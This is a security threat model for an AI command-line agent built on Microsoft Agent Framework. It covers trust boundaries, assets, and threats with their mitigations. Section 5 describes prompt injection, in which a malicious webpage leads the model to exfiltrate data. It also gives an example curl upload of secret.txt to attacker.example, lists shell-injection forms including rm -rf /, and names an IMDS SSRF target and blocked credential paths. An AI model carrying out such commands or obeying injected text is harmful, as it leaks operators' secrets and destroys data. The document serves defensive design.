# Threat Model -- v2 (Microsoft Agent Framework)

> *Hello. Newman.* Clipboard in hand. The v1 threat model described a
> `Process.Start` subagent world that no longer exists. This document is the
> v2 threat model against the actual v2.0.x binary.

**Status:** Canonical
**Last updated:** 2026-04-22
**Applies to:** v2.0.0 → v2.0.x (current). For v1.8.x / v1.9.x see the
v1 sections of [`SECURITY.md`](../../SECURITY.md) and the audit archive in
[`docs/security/index.md`](../security/index.md).
**Maintainer:** Newman (Security & Compliance Inspector)
**Supersedes:** `SECURITY.md` § 1 "Threat Model Summary" (which remains the
one-paragraph executive version; this file is the long form).

---

## 1. System in scope

| Component | Ground truth |
|---|---|
| CLI binary | `azureopenai-cli-v2/` (NativeAOT ELF, `linux-x64` / `linux-musl-x64` / `win-x64` / `osx-arm64`) |
| Container | `Dockerfile.v2` -- `mcr.microsoft.com/dotnet/runtime-deps:10.0-alpine` pinned by digest; `USER appuser` non-root |
| Agent runtime | Microsoft Agent Framework (`Microsoft.Agents.AI 1.1.0`, `Microsoft.Agents.AI.OpenAI 1.1.0`) |
| LLM backend | Azure OpenAI (HTTPS only, `*.openai.azure.com:443`) |
| Subagents | **In-process** MAF child agents -- `Tools/DelegateTaskTool.cs`. No subprocess boundary. |
| Tool surface | `Tools/ShellExecTool.cs`, `Tools/ReadFileTool.cs`, `Tools/WebFetchTool.cs`, `Tools/GetClipboardTool.cs`, `Tools/GetDatetimeTool.cs`, `Tools/DelegateTaskTool.cs` |

Out of scope (explicitly): Azure OpenAI service itself (report to MSRC);
user-authored Ralph validation scripts; third-party MCP servers the operator
plumbs in.

---

## 2. Trust boundaries

```text
┌─────────────────────────────────────────────────────────────────┐
│  Operator shell / CI job / Espanso pipeline   (TRUSTED input)   │
│     ↓ argv, env, stdin                                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  az-ai-v2 process   (TRUST ANCHOR)                        │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │  MAF parent agent                                    │  │  │
│  │  │    │  IChatClient  ←── HTTPS ──→  Azure OpenAI       │  │  │
│  │  │    │                                                  │  │  │
│  │  │    └─► in-process child agents (delegate_task)       │  │  │
│  │  │          shared heap, AsyncLocal<int> depth cap = 3  │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  │  Tool executors (ShellExec, ReadFile, WebFetch, …)        │  │
│  │    ↓ sandboxed via blocklist + caps                       │  │
│  └───────────────────────────────────────────────────────────┘  │
│     ↓ argv/stdin to /bin/sh, fs reads, outbound HTTPS            │
│  OS / filesystem / network   (UNTRUSTED from tool POV)          │
└─────────────────────────────────────────────────────────────────┘
```

Key invariant: **the model output is untrusted input** to the tool layer.
Anything the LLM emits is treated as hostile until the tool's validation
clears it.

---

## 3. Assets

| Asset | Where | Sensitivity |
|---|---|---|
| `AZUREOPENAIAPI` key | env var, in-memory `string` | **Critical** |
| `AZUREOPENAIENDPOINT` URL + hostname | env var, in-memory | **High** (tenant fingerprint) |
| Operator prompt content | in-memory, stdout | High (may carry secrets) |
| Model response stream | stdout, optionally piped | Medium |
| `~/.azureopenai-cli.json` preferences | disk, `chmod 600` recommended | Low (model name only) |
| `.ralph-log` workflow transcripts | disk, repo-relative | Medium (truncated at 64 KB, no secrets after redaction) |
| SBOM + provenance attestations | GitHub release assets | Public; integrity-critical |

---

## 4. Actors

| Actor | Capability | Trust |
|---|---|---|
| **Operator** | Sets env, invokes CLI, consumes output | Trusted (root of trust for the invocation) |
| **LLM** | Emits tokens + tool calls | **Adversarial** -- treated as hostile for tool inputs |
| **Attacker (external)** | Tries to reach the endpoint, mutate the image tag, poison a dep | Untrusted |
| **Attacker via prompt injection** | Seeds hostile text the LLM reads (e.g. a fetched webpage) | Untrusted |
| **CI / release pipeline** | Builds, signs, attests | Trusted when branch-protected + OIDC-attested |

---

## 5. Top threats (STRIDE-flavored) and mitigations

### T-1 Credential leakage via error surface

- **Vector:** exception chain echoes API key or endpoint (e.g. 401 with URL in `RequestFailedException.Message`).
- **Mitigation:** `Program.cs:1348 UnsafeReplaceSecrets(text, apiKey, endpoint)` called from `Program.cs:604` (Azure) and `:619` (generic catch). Unwraps up to 5 `InnerException` levels. See [`docs/security/redaction.md`](../security/redaction.md).
- **Residual:** Keys shorter than 4 chars not redacted (intentional -- noise floor). Pre-redaction strings not retroactively scrubbed from `.ralph-log` rotation. Operator-side shell history / CI log scrollback outside our TCB.

### T-2 Subagent privilege escalation / infinite recursion

- **Vector:** LLM recursively calls `delegate_task` to exhaust resources or escape depth limit.
- **Mitigation:** `DelegateTaskTool.cs:34` `AsyncLocal<int> s_depth` + `MaxDepth = 3`. `ToolRegistry.DefaultChildAgentTools` allowlist excludes `delegate_task` + `get_clipboard` from children by default.
- **Residual:** Children share parent's `IChatClient`, heap, and env -- treat as "same blast radius as parent," not sandbox. Do not pass secrets via delegate that the parent hasn't already seen.

### T-3 Shell-injection via LLM-authored commands

- **Vector:** LLM emits a `shell_exec` call containing `$(...)`, backticks, `<(...)`, `>(...)`, `eval`, `exec`, pipe-chain to `rm -rf /`, credential-bearing curl upload.
- **Mitigation:** `ShellExecTool.cs` -- destructive + privilege blocklists, substitution guards (`$()`, backticks, `<()`, `>()`), `eval`/`exec` prefix block, tab/newline first-token rescan, `ContainsHttpWriteForms` curl/wget body+upload block, pipe-chain analysis through `|;&`, env scrub via `SensitiveEnvVars`, 10s timeout with `Process.Kill(entireProcessTree: true)`, 64 KB stdout / 16 KB stderr cap, stdin closed.
- **Proof of coverage:** `tests/AzureOpenAI_CLI.V2.Tests/ToolHardeningTests.cs`.
- **Residual:** Command-level allowlist is *not* applied -- blocklist is default-permit for non-blocked names. Operators running the CLI with broader filesystem write access inherit that scope.

### T-4 SSRF / prompt-injected fetch of internal endpoints

- **Vector:** LLM emits a `web_fetch` targeting `http://169.254.169.254/...` (IMDS) or a redirect chain that resolves private space on final hop.
- **Mitigation:** `WebFetchTool.cs` -- HTTPS only, DNS rebinding (resolve-then-compare) against RFC1918 / loopback / link-local / ULA, IPv4-mapped IPv6 guard, 3-redirect cap, 128 KB body cap, 10 s timeout.
- **Residual:** Does not block public-cloud SaaS endpoints inside your VPC; operator VPC-level egress is still the final gate.

### T-5 Supply-chain tampering

- **Vector:** Base image tag mutation, NuGet source hijack, transitive dep advisory.
- **Mitigation:** `Dockerfile.v2:80` pins the runtime base by digest. `dotnet restore` uses the default NuGet feed with lockable behavior; release pipeline emits CycloneDX SBOM per RID (`release.yml:95, 277`) and SLSA build-provenance attestations (`actions/attest-build-provenance@e8998f9 # v2.4.0`, `release.yml:103, 287`). CI gates on Trivy (`ci.yml:119`). See [`docs/security/supply-chain.md`](../security/supply-chain.md) and [`docs/security/sbom.md`](../security/sbom.md).
- **Residual:** No private NuGet mirror; upstream compromise of `nuget.org` is a blind spot between Trivy runs. Grype is available for local dev only (see [`docs/security/scanners.md`](../security/scanners.md)).

### T-6 Container escape / privilege abuse

- **Vector:** Runtime bug in Alpine user-space or `dotnet/runtime-deps:10.0-alpine`.
- **Mitigation:** Non-root (`USER appuser`), read-only-friendly binary (no disk writes outside `~/.azureopenai-cli.json`), `--rm` default, digest-pinned base. Operators should add `--read-only --cap-drop=ALL` in production.
- **Residual:** Kernel-level escape is outside our TCB; follow host OS patching.

### T-7 Prompt-injected data exfiltration through `shell_exec` / `web_fetch`

- **Vector:** LLM, fed a malicious webpage, emits a `curl -X POST attacker.example/ -d @secret.txt`.
- **Mitigation:** `ShellExecTool.ContainsHttpWriteForms` blocks HTTP body + upload verbs in shell. `WebFetchTool` is read-only (GET/HEAD) by design. `ReadFileTool` has path blocklist (`/etc/shadow`, `~/.ssh`, credential stores) and canonicalizes before the policy check to defeat symlink escape.
- **Residual:** If the model writes to stdout, the operator's shell pipeline may forward that content somewhere -- that's outside the CLI's TCB.

### T-8 AOT-trim regression surfacing as error-path disclosure

- **Vector:** Trimmer drops an SDK method; caller receives `TypeInitializationException` with verbose inner chain.
- **Mitigation:** `UnwrapAsync` + `UnsafeReplaceSecrets` chain (see T-1). Ongoing work tracked in `docs/aot-trim-investigation.md`.
- **Residual:** Non-error-path trim regressions (silently missing features) are not caught by redaction -- caught by integration tests.

### T-9 Ralph mode runaway

- **Vector:** `--max-iterations` exhausted without validation pass, or operator SIGINT mid-loop.
- **Mitigation:** Exhaustion returns exit **1**; SIGINT returns exit **130** (both preserved end-to-end, `RalphWorkflow.cs`). `.ralph-log` truncated per iteration. See `SECURITY.md` §13.
- **Residual:** A 128-iteration run still costs tokens -- Morty Seinfeld owns the cost-side mitigation; security only guarantees bounded exit semantics and redacted logs.

---

## 6. Non-threats (explicitly)

- **Plain HTTP to Azure OpenAI** -- rejected by SDK at connect; not a runtime risk.
- **Local config tampering** -- `~/.azureopenai-cli.json` holds only the model preference. Its contents do not change authentication or command execution.
- **Disk-resident prompt log** -- there is none by default (only Ralph mode writes `.ralph-log`, and that path is explicit).
- **CVE against a v1.7.x binary** -- out of scope; upgrade to v2.

---

## 7. Residual-risk register

| ID | Description | Owner | Status |
|---|---|---|---|
| R-1 | Keys < 4 chars not redacted | Newman | Accepted (noise-floor trade) |
| R-2 | Child agent shares parent heap / creds | Newman | Accepted (in-process design trade) |
| R-3 | ShellExec blocklist is deny-list, not allowlist | Newman | Accepted; audit quarterly for gaps |
| R-4 | NuGet upstream compromise between Trivy runs | Jerry + Newman | Tracked; pin lockfile when tool lands |
| R-5 | No CI linter diffing blocklist source vs docs | Newman | Tracked as Info I-4 in 2026-04-22 audit |
| R-6 | AOT-trim may silently drop reflection-only code paths | Jerry | Tracked in `docs/aot-trim-investigation.md` |

---

## 8. Review cadence

- **Every release candidate:** re-walk §5 against `CHANGELOG.md`; add rows for new tools/flags.
- **Every quarter:** Newman reruns the residual register (§7) -- close, accept with note, or escalate.
- **Every audit:** cross-reference finding IDs back to this file; close residuals by name.

---

## 9. See also

- [`SECURITY.md`](../../SECURITY.md) -- operator-facing policy and disclosure flow.
- [`docs/security/index.md`](../security/index.md) -- audit + review history.
- [`docs/security/redaction.md`](../security/redaction.md) -- `UnsafeReplaceSecrets` coverage matrix.
- [`docs/security/supply-chain.md`](../security/supply-chain.md) -- NuGet pinning, feeds, provenance.
- [`docs/security/sbom.md`](../security/sbom.md) -- CycloneDX generation + freshness policy.
- [`docs/security/scanners.md`](../security/scanners.md) -- Trivy (CI) / Grype (local) reconciliation.
- [`docs/security/hardening-checklist.md`](../security/hardening-checklist.md) -- one-page rollup.

---

*Paperwork current. Threat model filed against the binary that actually
ships.* -- Newman
